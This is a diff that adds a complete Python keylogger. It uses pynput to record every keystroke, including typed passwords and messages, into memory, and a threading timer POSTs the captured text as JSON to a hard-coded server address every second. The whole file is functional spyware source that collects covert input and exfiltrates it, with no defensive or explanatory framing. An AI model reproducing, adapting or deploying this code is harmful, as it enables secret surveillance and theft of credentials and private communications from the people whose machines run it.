@@ -1,0 +1,46 @@
+import pynput.keyboard as keyboard
+import json
+import threading
+import requests
+
+ip = "192.168.1.100"
+port = 8000
+time_interval = 1
+
+# Initialize text variable
+text = ""
+
+def send_request():
+    global text
+    payload = json.dumps({"keyboardData": text})    
+    r = requests.post(f"http://{ip}:{port}", data=payload, headers={"Content-Type": "application/json"})
+    timer = threading.Timer(time_interval, send_request)
+    timer.start()
+
+def on_press(key):
+    global text
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
+        text += str(key).strip("'")
+
+with keyboard.Listener(on_press=on_press) as listener:
+    # We start off by sending the post request to our server.
+    send_request()
+    listener.join()
